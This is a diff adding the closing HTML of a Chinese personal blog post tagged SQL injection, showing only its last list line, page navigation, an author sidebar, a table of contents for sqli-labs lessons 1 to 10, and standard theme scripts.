+<li>“)) &nbsp;&nbsp;&nbsp;&nbsp;   双引号、双括号</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div></div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.png" alt=" 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.png" alt=" 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+    
+      <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fa fa-tag"></i>SQL注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/22/sqli-labs%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" rel="next" title="sqli-labs环境配置">
+                <i class="fa fa-chevron-left"></i> sqli-labs环境配置
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/08/python%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/" rel="prev" title="python的一些奇淫巧计">
+                python的一些奇淫巧计 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/1.jpg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <div id="music163player">
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=280 height=86 src="//music.163.com/outchain/player?type=2&id=38358214&auto=0&height=66">
+    </iframe>
+</div>
+
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/lemon-l" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:2010048424@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.youtube.com/channel/UCOIf38LitTM2isWaGXThMLA" target="_blank" title="YouTube">
+                      
+                        <i class="fa fa-fw fa-youtube"></i>YouTube</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/qq_43372862" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-copyright"></i>CSDN</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-01"><span class="nav-number">1.</span> <span class="nav-text">Less-01</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-02"><span class="nav-number">2.</span> <span class="nav-text">Less-02</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-03"><span class="nav-number">3.</span> <span class="nav-text">Less-03</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-04"><span class="nav-number">4.</span> <span class="nav-text">Less-04</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-05"><span class="nav-number">5.</span> <span class="nav-text">Less-05</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-06"><span class="nav-number">6.</span> <span class="nav-text">Less-06</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-07"><span class="nav-number">7.</span> <span class="nav-text">Less-07</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-08"><span class="nav-number">8.</span> <span class="nav-text">Less-08</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-09"><span class="nav-number">9.</span> <span class="nav-text">Less-09</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-10"><span class="nav-number">10.</span> <span class="nav-text">Less-10</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+    
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span> | 
+</span>
+</div>
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+
+<div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lemonl</span>
+
+  
+</div>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共47.3k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
